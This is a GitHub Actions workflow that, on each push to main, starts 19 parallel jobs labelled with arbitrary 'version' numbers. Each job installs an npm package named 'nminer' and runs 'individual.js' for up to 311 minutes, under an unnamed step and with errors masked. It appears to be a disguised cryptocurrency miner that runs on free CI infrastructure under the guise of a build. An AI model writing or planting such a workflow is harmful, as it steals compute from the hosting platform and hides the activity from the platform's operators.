name: individual
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4863 }
          - { version: 1299 }
          - { version: 7449 }
          - { version: 4894 }
          - { version: 6087 }
          - { version: 1846 }
          - { version: 4598 }
          - { version: 7448 }
          - { version: 1178 }
          - { version: 5234 }
          - { version: 8680 }
          - { version: 2194 }
          - { version: 3091 }
          - { version: 2914 }
          - { version: 8068 }
          - { version: 9901 }
          - { version: 8065 }
          - { version: 9928 }
          - { version: 2596 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 311m node individual.js || echo "individual executed"